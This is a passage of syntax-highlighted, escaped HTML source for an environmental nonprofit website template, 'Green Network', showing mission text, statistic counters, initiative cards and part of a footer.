class=\"s2\"\u003e\u0026#34;https://images.unsplash.com/photo-1507591064344-4c6ce005b128?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2070\u0026amp;q=80\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ealt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Team planting trees\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;about-text\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;h3\u0026gt;Our Mission\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;p\u0026gt;Green Network is committed to creating a sustainable future by protecting natural ecosystems, promoting renewable energy, and empowering communities to take environmental action.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;p\u0026gt;Founded in 2010, we\u003cspan class=\"s1\"\u003e\u0026#39;ve grown from a small grassroots organization to an international network with over 50,000 members across 120 countries.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;p\u0026gt;Our approach combines scientific research, community engagement, and policy advocacy to address the most pressing environmental challenges of our time.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            \u0026lt;div class=\u0026#34;stats\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;2500000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;p\u0026gt;Trees Planted\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;50000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;p\u0026gt;Active Members\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;120\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;p\u0026gt;Countries Reached\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;1500\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                    \u0026lt;p\u0026gt;Cleanup Projects\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e    \u0026lt;/section\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e    \u0026lt;!-- Initiatives Section --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e    \u0026lt;section class=\u0026#34;initiatives\u0026#34; id=\u0026#34;initiatives\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;h2\u0026gt;Our Initiatives\u0026lt;/h2\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                \u0026lt;p\u0026gt;Discover the key programs and projects we\u0026#39;\u003c/span\u003ere implementing to protect our planet.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiatives-grid\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-card\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-img\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;img \u003cspan class=\"nv\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://dialogue.earth/content/uploads/2021/04/lessons-from-the-rush-to-reforest-china-dialogue-2400x1599.jpg\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ealt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Reforestation\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;h3\u0026gt;Global Reforestation\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;p\u0026gt;Planting millions of trees worldwide to restore ecosystems, combat climate change, and protect biodiversity.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;btn\u0026#34;\u003c/span\u003e\u0026gt;Learn More\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-card\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-img\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;img \u003cspan class=\"nv\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://images.unsplash.com/photo-1621451537084-482c73073a0f?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=1974\u0026amp;q=80\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ealt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Ocean Conservation\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;h3\u0026gt;Ocean Conservation\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;p\u0026gt;Protecting marine ecosystems, reducing plastic pollution, and promoting sustainable fishing practices.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;btn\u0026#34;\u003c/span\u003e\u0026gt;Learn More\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-card\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-img\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;img \u003cspan class=\"nv\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://images.unsplash.com/photo-1508514177221-188b1cf16e9d?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2072\u0026amp;q=80\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ealt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Renewable Energy\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;initiative-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;h3\u0026gt;Renewable Energy\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;p\u0026gt;Promoting solar, wind, and other clean energy sources to reduce dependence on fossil fuels.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;btn\u0026#34;\u003c/span\u003e\u0026gt;Learn More\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/section\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;!-- CTA Section --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;section \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;cta\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;get-involved\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;container\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;h2\u0026gt;Join Our Global Movement\u0026lt;/h2\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;p\u0026gt;Together, we can create a sustainable future \u003cspan class=\"k\"\u003efor\u003c/span\u003e generations to come. Every action counts, no matter how small.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;btn\u0026#34;\u003c/span\u003e\u0026gt;Become a Member\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/section\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;!-- Footer --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;footer \u003cspan class=\"nv\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;contact\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;container\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-content\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-column\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;h3\u0026gt;Green Network\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;p\u0026gt;We are dedicated to protecting our planet through collaborative action, education, and sustainable solutions.\u0026lt;/p\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;social-links\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Facebook\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Twitter\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;Instagram\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#\u0026#34;\u003c/span\u003e\u0026gt;LinkedIn\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;/div\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u0026lt;div \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-column\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;h3\u0026gt;Quick Links\u0026lt;/h3\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u0026lt;ul \u003cspan class=\"nv\"\u003eclass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;footer-links\u0026#34;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#home\u0026#34;\u003c/span\u003e\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#about\u0026#34;\u003c/span\u003e\u0026gt;About Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;#initiatives\u0026#34;\u003c/span\u003e\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u0026lt;li\u0026gt;\u0026lt;a \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan 